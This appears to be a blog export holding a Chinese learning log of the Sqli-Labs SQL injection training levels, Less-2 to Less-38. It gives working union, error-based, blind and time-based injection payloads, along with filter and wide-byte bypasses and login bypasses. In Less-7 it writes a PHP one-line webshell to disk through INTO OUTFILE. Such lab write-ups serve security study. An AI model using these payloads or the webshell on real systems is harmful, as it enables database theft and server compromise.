+<h2 id="Less-25a："><a href="#Less-25a：" class="headerlink" title="Less-25a："></a>Less-25a：</h2><p>这一关和上一关不同的是没有报错，id处没有‘’,其他和上一关一样，所以我们可以使用联合注入或者延时注入。</p>
+<p>联合注入就很简单了，咋们来看一下延时注入。</p>
+<p><code>?id=1 anandd if(ascii(substr(database(),1,1))&gt;1,0,sleep(5))--+</code>其他的自行构造。</p>
+<h2 id="Less-26："><a href="#Less-26：" class="headerlink" title="Less-26："></a>Less-26：</h2><p>这一关难度暴增啊，，直接把字符给过滤完了，查看源代码，发现过滤了 and or 空格，–, # ,后面的过滤–+和# 我们可以用闭合去绕过，但是空格咋办嘞，网上查了一下，发现对于空格的绕过有这么几种办法</p>
+<ol>
+<li>%09   TAB键（水平的）</li>
+<li>%0a   新建一行</li>
+<li>%0c   新的一页</li>
+<li>%0d   return功能</li>
+<li>%0b   TAB键（垂直的）</li>
+<li>%a0   空格</li>
+<li>()        用括号代替  例如 select database()  &#x3D;&#x3D; select(database())</li>
+</ol>
+<p>暂时就这么多，但是上面这些大多不能用，因为我是windows系统，好像是因为apache 的解析，这些编码不能用,linux 可以用一些。（）是可以用的，我这里使用的报错注入，也没用空格，在||后面直接可以加入字符</p>
+<p><code>?id=1&#39;||extractvalue(1,concat(&#39;~&#39;,database()))||&#39;1&#39;=&#39;1</code>这样是可行的</p>
+<p>在Linux中的话%0b %a0是可以用的，就可以用联合查询。</p>
+<h2 id="Less-26a："><a href="#Less-26a：" class="headerlink" title="Less-26a："></a>Less-26a：</h2><p>这一关和上面差不多，但是在id处是‘），还有就是没有回显，所以我们不能使用报错注入，只要是没回显，优先考虑时间注入，构造payload</p>
+<p><code>?id=1&#39;)anandd(if(ascii(substr(database(),1,1)),sleep(5),0))anandd(&#39;1</code>欧克，解决！</p>
+<h2 id="Less-27："><a href="#Less-27：" class="headerlink" title="Less-27："></a>Less-27：</h2><p>这一关是过滤了union select  还有之前的一些，但是把and or 放出来了，不知道为什么，order by 不行，所以我们直接查询<code>?id=434534&#39;%0AUnIon%0ASElect%0A1,2,3||&#39;1</code>空格可以用%0a 绕过，惭愧，我也是在这一关发现可以使用的，估计之前也可以用，但是看了大佬的文章以为不能用就没有尝试，以此警示！</p>
+<p>其他查询语句自行构造。</p>
+<h2 id="Less-27a："><a href="#Less-27a：" class="headerlink" title="Less-27a："></a>Less-27a：</h2><p>和上关一样，只是id处是“，其他没有不同。</p>
+<h2 id="Less-28："><a href="#Less-28：" class="headerlink" title="Less-28："></a>Less-28：</h2><p>这一关和上面的基本一样，除了id处是’），还有就是之前的大小写过滤是可行的，但是两个中间用%0a 的话就会被过滤，尝试用%a0就行了。</p>
+<p><code>?id=434534%27)%0AUnIon%a0SElect%0A1,2,3||(%271</code></p>
+<h2 id="Less-28a："><a href="#Less-28a：" class="headerlink" title="Less-28a："></a>Less-28a：</h2><p>和上关一样。</p>
+<h2 id="Less-29："><a href="#Less-29：" class="headerlink" title="Less-29："></a>Less-29：</h2><p>重点： index.php?id&#x3D;1&amp;id&#x3D;2， 你猜猜到底是显示 id&#x3D;1 的数据还是显示 id&#x3D;2 的？<br>Explain： apache（php） 解析最后一个参数， 即显示 id&#x3D;2 的内容。 Tomcat（jsp） 解析第一个参数， 即显示 id&#x3D;1 的内容。<br>此处我们想一个问题： index.jsp?id&#x3D;1&amp;id&#x3D;2 请求， 针对第一张图中的服务器配置情况，客户端请求首先过 tomcat， tomcat 解析第一个参数， 接下来 tomcat 去请求 apache（php）服务器， apache 解析最后一个参数。 那最终返回客户端的应该是哪个参数？<br>Answer： 此处应该是 id&#x3D;2 的内容， 应为时间上提供服务的是 apache（ php） 服务器，返回的数据也应该是 apache 处理的数据。 而在我们实际应用中， 也是有两层服务器的情况，那为什么要这么做？ 是因为我们往往在 tomcat 服务器处做数据过滤和处理， 功能类似为一个 WAF。 而正因为解析参数的不同， 我们此处可以利用该原理绕过 WAF 的检测。 该用法就是 HPP（ HTTP Parameter Pollution） ， http 参数污染攻击的一个应用。 HPP 可对服务器和客户端都能够造成一定的威胁。</p>
+<p>现在我们来看这一关，查看tomcat 的index.jsp，发现对第一个参数是过滤了的，那我们就在第二个参数处构造，因为这个参数是不会经过jsp的，直接会通过php ，构造payload <code>?id=1&amp;id=-2&#39; union select 1,database(),version()--+ </code>，用联合注入和报错注入都可以。   </p>
+<h2 id="Less-30："><a href="#Less-30：" class="headerlink" title="Less-30："></a>Less-30：</h2><p>这一关和上一关一样，id处是”。</p>
+<h2 id="Less-31："><a href="#Less-31：" class="headerlink" title="Less-31："></a>Less-31：</h2><p>同上所述，id处是“）。</p>
+<h3 id="宽字节注入："><a href="#宽字节注入：" class="headerlink" title="宽字节注入："></a>宽字节注入：</h3><p>这个注入的原理是针对语句中过滤了单引号和斜杠的注入方法。</p>
+<p>MySQL在使用GBK编码的时候，会认为两个字符是一个汉字，而在过滤的时候往往会在单引号前面加上&#x2F;来过滤</p>
+<p>方法：</p>
+<ol>
+<li>使用%df吃掉&#x2F;，&#x2F;‘的转码为%5c%27，如果在前面加上一个%df ，那么就会变成%df%5c%27，刚好，前面的%df%5c组成就是一个汉字，于是就变成了一个汉字后面有个单引号，就成功了</li>
+<li>将&#x2F;‘过滤掉，例如构造%**%5c%5c%27的方法，后面的%5c会被前面的%5c过滤掉。</li>
+</ol>
+<h2 id="Less-32："><a href="#Less-32：" class="headerlink" title="Less-32："></a>Less-32：</h2><p>这一关我们按找上面讲的，先输入单引号，发现果然被过滤了，输入\也是被过滤了，构造宽字节注入，<code>?id=1%df&#39;--+</code>发现直接绕过，然后就可以使用联合查询或者报错注入。</p>
+<h2 id="Less-33："><a href="#Less-33：" class="headerlink" title="Less-33："></a>Less-33：</h2><p>和上一关一样，只是查看源码，发现是使用了addslashes()函数，他会在预定义字符前面加上反斜杠，单引号，双引号。斜杠。</p>
+<h2 id="Less-34："><a href="#Less-34：" class="headerlink" title="Less-34："></a>Less-34：</h2><p>前面几关是ge的注入，现在开始是post的注入，post注入和get不太一样，%df 这个直接输行不通，使用bp可以实现，修改post语句。在书上是还有一种方法，将’使用utf-16或者utf-32编码，但是我没有找到可以转换的地方，就不了了之了。</p>
+<h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35:"></a>Less-35:</h2><p>这一关没有什么特别的，不用考虑addslashes（）函数，直接联合查询。</p>
+<h2 id="Less-36："><a href="#Less-36：" class="headerlink" title="Less-36："></a>Less-36：</h2><p>这一关我们查看源代码，发现使用是mysql_real_escape_string()函数过滤的，这个函数会转义一些特殊字符，单双引号，\n \r  \x00 这些。因为没有设置gbk，所以我们可以绕过，用%EF%BF%BD这个，然后构造payload就可以了。</p>
+<p><code>?id=-1%EF%BF%BD%27 union select 1,database(),3--+</code>，其他的自行构造。</p>
+<h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37:"></a>Less-37:</h2><p>和34关类似，通过万能密码登录</p>
+<p><code>uname=1%EF%BF%BD%27 or 1=1#</code></p>
+<h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38:"></a>Less-38:</h2><p>这一关很离谱哈，和之前一摸一样，第一关。</p>
+<p>至此，page-2已经全部完全，练习中学习，加油，进击下一关！！！</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Sqli-Labs-master 注入训练(Page-1)</title>
+    <url>/2023/05/15/Sqli-Labs%E6%B3%A8%E5%85%A5%E8%AE%AD%E7%BB%83/Sqli-Labs-master%20%E6%B3%A8%E5%85%A5%E8%AE%AD%E7%BB%83%EF%BC%88Page-1%EF%BC%89/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>咋们直接从第二关开始练习</p>
+<h2 id="Less-2："><a href="#Less-2：" class="headerlink" title="Less-2："></a>Less-2：</h2><p>第二关在 id&#x3D;1 后面直接加一个单引号，报错，所以知道查询语句整体是有的单引号闭合的，所以后面直接跟<code>order by 3--+</code>，正常回显，<code>order by 4--+</code>，报错，超出范围，将id改为-1，后面跟上<code>union select 1,2,3--+</code>，有2和3 的回显</p>
+<span id="more"></span>
+<p>在2的位置查询数据库名字<code>database()</code> 在3的位置查询名字或者版本或者数据库路径或者数据库系统<code>user() or version() or @@datadir or @@version_compile_os</code></p>
+<p>接着再查询数据库中的所有数据库名<code>union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+</code></p>
+<p>查询当前数据库的所有表名<code>union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code></p>
+<p>查询users表中的所有列名<code>union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3--+</code></p>
+<p>查询id, username, password 中的信息<code>union select 1,(select group_concat(id,username,password) from users),3--+</code></p>
+<p>至此，成功爆出数据库的信息</p>
+<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3:"></a>Less-3:</h2><p>在<code>id=1</code>后面输入一个单引号，报错，输入两个单引号，回显正常，所以在1那里有一对单引号，我们需要闭合那个单引号，查询语句就要写成<code>id=1&#39; order by 3--+</code> 其他的操作如Less-2一样。</p>
+<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4:"></a>Less-4:</h2><p>在id&#x3D;1后面输入一个单引号，没有报错，输入一个双引号，报错，根据报错的地方我们可以看出来，在1的那部分有一个双引号和一个括号，用<code>&quot;)--+</code>闭合，回显正常，所以查询语句是<code>id=1&quot;) order by 3--+</code>  其他的操作如Less-2一样。</p>
+<h2 id="sql盲注："><a href="#sql盲注：" class="headerlink" title="sql盲注："></a>sql盲注：</h2><h3 id="常用的几个函数："><a href="#常用的几个函数：" class="headerlink" title="常用的几个函数："></a>常用的几个函数：</h3><ol>
+<li><p>left()   这个函数的作用是从字符串的左边开始截取，<code>id=1 and left(database(),1)=&#39;s&#39;--+</code>，截取几个就显示几个，<code>?id=1 and left(database(),3)=&#39;sec&#39;--+</code></p>
+</li>
+<li><p>substr()   这个函数的作用也是截取字符串，但是是从特定位置截取特定字符串的，<code>?id=1 and substr(database(),1,1)==&#39;s&#39;--+</code></p>
+</li>
+<li><p>mid()  这个函数的作用和substr() 一样</p>
+</li>
+<li><p>ascii() 函数   这个函数是将字符串转换成ascii码，如果是一个字符串中的字母比一个多，只会识别第一个字符</p>
+</li>
+<li><p>ord() 这个函数和ascii函数一样。</p>
+</li>
+</ol>
+<h3 id="regexp正则注入"><a href="#regexp正则注入" class="headerlink" title="regexp正则注入"></a>regexp正则注入</h3><p>判断数据库的第一个字符在不在[a-z] 中，<code>?id=1 and 1=(select 1 from information_schema.tables where table_schema=database() and table_name regrxp &#39;^[a-n]&#39;limit 0,1)</code> 接下来就修改正则表达式 <code>&#39;^n[a-n]&#39;</code>不断尝试。因为table_name 有很多个，是不需要修改Limit的，只需要大量匹配。</p>
+<p>举例说明：我有两个表，users 和  emails   当我<code>and table_name regrxp &#39;^us[a-n]&#39;limit 0,1</code>成立，匹配这个<code>and table_name regrxp &#39;^em[a-n]&#39;limit 0,1</code>也是成立的。关键在第一个你匹配的是啥。</p>
+<p>like匹配  这个和正则匹配一样，是模糊匹配</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>payload： <code>?id=1 union Select 1,count(*),concat(0x3a,0x2d,database(),floor(rand(0)*2))a from information_schema.columns group by a--+</code></p>
+<p>count() 函数，这个函数是统计字符出现的次数</p>
+<p>floor() 这个函数是向下取整，floor(3.4)&#x3D;3</p>
+<p>rand()  这个函数是生成一个随机数，如果里面没有参数，就是返回一个随机的0—1之间的数</p>
+<p><a href="https://www.freebuf.com/articles/web/255522.html%E8%BF%99%E4%B8%AA%E6%96%87%E7%AB%A0%E8%AE%B2%E7%9A%84%E7%89%B9%E5%88%AB%E6%B8%85%E6%A5%9A%E3%80%82">https://www.freebuf.com/articles/web/255522.html这个文章讲的特别清楚。</a></p>
+<p>floor(rand(0)*2)这个的取值要么是1 ，要么是 0.</p>
+<p>报错注入的关键是group by a;还有count() 聚合函数，将相同的查询到的内容聚合，分成两组</p>
+<p>还有常用的payload:  <code>select count(*),concat((select database()), floor(rand(0)*2))as a from information_schema.tables group by a;</code></p>
+<p>简化payload : <code>select count(*) from information_schema.tables group by concat(versison(),floor(rand(0)*2))</code>（但是我没实现出来）</p>
+<p>当关键表被禁用的时候，可以是哦难过以下查询</p>
+<p><code>select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2))</code>(也没实现)</p>
+<p>当rand() 函数被禁用(没实现)</p>
+<p><code>select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</code></p>
+<h3 id="exp-注入"><a href="#exp-注入" class="headerlink" title="exp()注入"></a>exp()注入</h3><p>当传递一个大于709的数时，exp() 函数会有溢出报错，exp 函数是计算自然底数e的n次方，在MySQL中，log函数和ln 函数一样，都是返回以e为底数的对数，和exp 函数刚好相反。</p>
+<p><code>mysql&gt;  select ~0</code>会返回一个很大的数字，前面那个符号是取反，所以构造函数，当函数执行成功时，会返回0，再取反，数字很大，再使用exp()函数，就会报错。（不知道是不是我mysql版本的问题，报错格式对了，内容不对）。</p>
+<h3 id="extractvalue-和updatexml-报错注入"><a href="#extractvalue-和updatexml-报错注入" class="headerlink" title="extractvalue()和updatexml()报错注入"></a>extractvalue()和updatexml()报错注入</h3><p>extractvalue()函数是对xml 文档进行查询的函数，所以在这个函数的第二个参数必须要是xml格式，如果不是，就会把错误的地方爆出来，updatexml函数也是一样的，不同的是第一个函数有两个参数，第二个有三个参数。</p>
+<p>extractvaue()<code>http://127.0.0.1:81/sqli-labs-master/Less-1/?id=1%27%20and%20extractvalue(%27anything%27,concat(%27~%27,(select%20database())))--+</code>格式就是这样的。</p>
+<p>updatexml()  <code>http://127.0.0.1:81/sqli-labs-master/Less-1/?id=1%27%20and%20(updatexml(%27anything%27,concat(%27~%27,(select%20database())),%27anything%27))--+</code> 两个函数很相似。</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>if函数，if(a,b,c) 如果a 可以执行的话，就执行b , 不然就执行c,,在这里常常和sleep函数搭配。</p>
+<p><code>?id=1 and if(ascii(substr(database(),1,1))&gt;100,0,sleep(5))--+</code>解释：如果数据库的第一个字母的ascii码大于100，就直接返回，否则延迟5秒加载网页。</p>
+<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5:"></a>Less-5:</h2><p>在id后面输入1 或者 2 或者 55 或者随便的字符，页面始终不变，这就说明页面不会显示数据，只能用报错来判断是否正确，构造payload  <code>id=1&#39; and length(database())&gt;10--+</code>此时页面与之前的显示不符，说明数据库的字符长度小于等于10，再次重复构造，直到得出数据库的字符长度是8，然后开始使用substr函数和ascii函数进行测试，构造payload，<code>id=1&#39; and ascii(substr(database(),1,1))&gt;100--+</code>这里我写了一个python小脚本来跑，速度会快很多。</p>
+<p>接着构造<code>id=1&#39; and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;100--+</code>以下同理。</p>
+<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6:"></a>Less-6:</h2><p>当输入双引号的时候，发现有报错，所以在id&#x3D;1后面加上一个双引号，再进行脚本爆破。</p>
+<h2 id="导入导出相关操作"><a href="#导入导出相关操作" class="headerlink" title="导入导出相关操作"></a>导入导出相关操作</h2><ol>
+<li><h3 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h3><p>load_file(file_name)读取文件并返回文件的内容作为第一个字符串</p>
+<p>使用条件：</p>
+<pre><code>必须有权限读取并且文件完全可读  and (select count(*) from mysql.user)&gt;0  如果返回正常，说明具有读写权限。
+ 
+欲读取文件必须在服务器上
+ 
+必须指定文件完整的路径
+</code></pre>
+<p>例子：<code>select 1,2,3,4,5,6,7,hex(replace(load_file(char(9,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))))</code>利用hex()将文件内容导出，尤其是smb文件时可以使用。</p>
+<p><code>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</code></p>
+<p>LOAD DATA INFILE 语句用于高速从一个文本文件中读取行，并装入一个表，文件名必须为一个文字字符串。</p>
+<p>select … into outfile ‘file_name’ 可以把被选择的行写入一个文件中，该文件被创建到服务器上，因此必须拥有file权限，file_name不能是一个已经存在的文件。</p>
+<p>例子：<code>select version() into outfile &#39;C:\\phpnow\\htdocs\\test.php&#39;</code></p>
+<p><code>select version() into dumpfile &#39;C:\\phpnow\\htdocs\\test.php&#39;</code>用于二进制文件</p>
+<p>可以把version 换成一句话木马，然后用菜刀连接就行。</p>
+<p>第二种是修改文件的结尾：</p>
+<p><code>select version() into outfile &#39;c://phpnow//htdocs//test.php&#39; line terminated by 0x16进制文件</code></p>
+<p>通常是以‘\r\n’结尾，此处修改为我们像上传的文件，类似大马，同时也可以用FIELDS TEEMINATED BY (分隔符)</p>
+</li>
+</ol>
+<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7:"></a>Less-7:</h2><p>当输入单引号的时候，开始报错，输入双引号不报错，但是我以为是对单引号有过滤，但是好几种绕过单引号的方法都不行，于是看了一下源代码，原来是在id&#x3D;1的后面有一个单引号和两个括号，于是构造<code>id=1&#39;))</code>然后用Less-5的脚本爆破。</p>
+<hr>
+<p>今天看了一些文章，发现这关不是这么玩的，这一关按照提示，是要通过文件上传来。</p>
+<p>首先要检测有没有上传文件的权限，<code>?id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+</code>如果页面返回正常的话，就是说明有上传权限。</p>
+<p>上传文件之前要知道正确的文件路径，还要确定secure_file_priv权限是开启的，这个权限在mysql的配置文件中，修改my.ini，有的话修改secure_file_priv后面的参数，空的话就是不限制任何文件，如果是null的话，就是不能读写，但是后面是指定的文件的话，就是只能对这个文件读写。</p>
+<p>开始尝试写入<code>?id=1 union select 1,2,&quot;qwerty&quot; into outfile &quot;D:\\phpstudy_pro\\WWW\\1.php&quot;--+</code>，回车之后发现页面还是报错，但是文件已经被写入文件夹了，开始写入一句话木马，<code>?id=1 union select 1,2,&quot;&lt;?php @eval($_POST[&#39;test&#39;]);?&gt;&quot; into outfile &quot;D:\\phpstudy_pro\\WWW\\1.php&quot;--+</code>或者into dumpfile，发现文件已经被写入，直接用菜刀连接，连接成功。</p>
+<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8:"></a>Less-8:</h2><p>我以为这道题会不同，没想到和Less-5一样。更新了一下脚本，一次性将所有的都跑出来了。</p>
+<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9:"></a>Less-9:</h2><p>输入什么都不变，看了一下源码，是单引号，但就是没反应，放到自己写的脚本中，确实也跑出来了，于是看了文章，是时间注入。<code>http://localhost:81/sqli-labs-master/Less-9/?id=1%27%20and%20if((ascii(substr(database(),1,1))%3E100),sleep(4),0)--+</code></p>
+<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10:"></a>Less-10:</h2><p>和第九关一样，只是把单引号变成了双引号。</p>
+<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11:"></a>Less-11:</h2><p>从这关开始，就进入了post注入，页面是一个登录界面，在username 那里输入一个单引号，不出意外，确实报错了，根据报错信息，我们可以看出来，在username 和password 处有单引号限制，然后尝试用万能密码：1’ or 1&#x3D;1# 结果就登录进去了，其他的payload 和第一关一样。</p>
+<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12:"></a>Less-12:</h2><p>尝试输一下单引号，没有回显，输入双引号，报错，报错信息中可以看出是双引号加一个括号的限制。其他和上一关一样。</p>
+<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13:"></a>Less-13:</h2><p>尝试输入一个单引号，没想到直接报错，在id 出有’）的限制。输入1‘）or 1&#x3D;1# 发现登录成功，但是没有信息，只是图片改变了，所以这一关是无回显注入，主要看图片，和前面几关相似。</p>
+<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14:"></a>Less-14:</h2><p>输入双引号，报错，其他和13关一样。使用extractvalue()函数和updatexml()函数可以将信息显示出来</p>
+<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15:"></a>Less-15:</h2><p>这一关不管输入单引号还是双引号和括号，都不报错，所以没有信息，使用玩我能密码可以登录，也确定是单引号限制，用时间注入。</p>
+<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16:"></a>Less-16:</h2><p>这一关直接使用万能密码，经过不断尝试，发现id处是“）的限制，使用extractvalue()函数和updatexml()函数也不管用，可以用时间盲注。（注意，在前面的一定是admin”) and 这种形式的，因为必须要匹配一个，或者输一个不可能的数，换成or）.</p>
+<h3 id="MySQL数据库的增删查改"><a href="#MySQL数据库的增删查改" class="headerlink" title="MySQL数据库的增删查改"></a>MySQL数据库的增删查改</h3><p>增： INSERT INTO 表名（字段名1，字段名2，）VALUES（值1，值2）；</p>
+<p>例： INSERT INTO student(id,username,grade) VVALUES（1，’zhangshan ‘,98）如果不指定字段名，则添加的值的顺序和字段在表中一样。</p>
+<p>INSERT INTO student SET id&#x3D;4,name&#x3D;’skk’,grade&#x3D;72;这个也一样。可以同时添加多条信息。</p>
+<p>删：DELETE FROM 表名 WHERE 条件表达式</p>
+<p>例 ： DELETE FROM student WHERE id&#x3D;7;DELETE * FROM student;删除整个表TRUNCATE    TRUNCATE TABLE student;使用delete 删除表时，吓一条记录会接着添加，但是使用truncate会从1开始。</p>
+<p>改：——更新数据</p>
+<p>UPDATE 表名 SET 字段名1&#x3D;值1，字段名2&#x3D;值2， WHERE 条件表达式。</p>
+<p>UPDATE student SET name&#x3D;’cc’,grade&#x3D;4 WHERE id&#x3D;1;  更新全部数据 UPDATE student SET grade&#x3D;80;</p>
+<p>查：简单查询语句 SELECT id,name,grade from students;SELECT * FROM students;</p>
+<p>SELECT * FROM students WHERE id&gt;5;            SELECT * FROM students WHERE id IN (1,2,3);  not in</p>
+<p>SELECT id,name FROM students WHERE id BETWEEN 2 AND 5;</p>
+<p>空值查询： SELECT * FROM student2 WHERE gender IS NULL;</p>
+<p>用来过滤重复的值，值保留一个：SELECT DISTINCT gender FROM student2;</p>
+<p>用来匹配任意长度的字符串：SELECT id,name FROM student2  WHERE name LIKE “S%”; </p>
+<p>下划线通配符；SELECT * FROM student2 WHERE name LIKE ‘wu_ong’;</p>
+<p>OR 和 AND 一起使用的时候，AND 的优先级高于 OR</p>
+<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17:"></a>Less-17:</h2><p>这一关我不管输入单引号，双引号和括号，都没有显示，根据提示，是要更新密码，我们可以尝试输入一个正确的账号，密码随便输，结果发现提示更新成功，我们可以猜想语句是先查询有没有账号，有的话修改密码，所以我们构造payload， 在账号那里还是填写admin，密码出写<code>1&#39; and extractvalue(1,concat(&#39;~&#39;,database()))#</code>，发现信息报错出来了，其他的和的上面一样构造就行了。</p>
+<p>为什么不构造username: 查看源代码，发现有一个函数，check_input()，这个函数设置了几道对username 的检测，</p>
+<p>addslashes()函数，返回预定义字符之间添加反斜杠。预定义字符是单引号，双引号，反斜杠，null ，因为php 对所有的get.post .cookie 都会自动运行addslashes()，所以不能对已转义过的字符串使用addslashes()，会导致双层转义，遇到这种情况可以使用函数get_magic_quotes_gpc()进行检测。</p>
+<p>stripslashes()函数删除由 addslashes()函数添加的反斜杠</p>
+<p>mysql_real_escape_string()  函数转义sql语句中使用的字符串中的特殊字符。</p>
+<p>在check_input（）对username 进行了各种转义，所以此处不能进行注入。</p>
+<h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18:"></a>Less-18:</h2><p>这一关打开后，发现写着你的IP是127.0.0.1，所以可能想到的是headers请求头的注入。构造请求头，</p>
+<p>user-agent就可以了。</p>
+<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19:"></a>Less-19:</h2><p>这一关和上一关一样，当输入正确的账号和密码的时候，发现出来的是referer，于是构造referer ,和上一题一样，只是把useragent 变成referer.</p>
+<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20:"></a>Less-20:</h2><p>从源代码中我们发现，cookie从username中获得值后，当再次刷新时，会从cookie中读取username，然后进行查询，</p>
+<p>修改cookie为uname&#x3D;admin1’ and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#就可以了。这个可以使用burpsuite来抓包修改，我用python不知道为什么没有请求成功。</p>
+<h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21:"></a>Less-21:</h2><p>首先输入正确的账号和密码，发现返回的界面和上一关一摸一样，只是在cookie 那里的数据被加密过，而且比较像base64的加密，把加密数据解密，发现就是咋们登录的账号，所以这一关的思路和上一关的一摸一样，但是我们的注入语句要加密过一遍才行。</p>
+<p>但是当我把上一关的payload加密之后提交上去时，发现过滤字符出了问题，尝试发现是’)的过滤，修改payload ，直接成功。</p>
+<h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22:"></a>Less-22:</h2><p>这一关和上一关又是一样的，除了过滤字符不同，这一关的过滤字符是：‘“</p>
+<p>ok，至此，sqli-labs-master 的第一大关就算过了，让我们继续旅吧！！！！</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+</search>
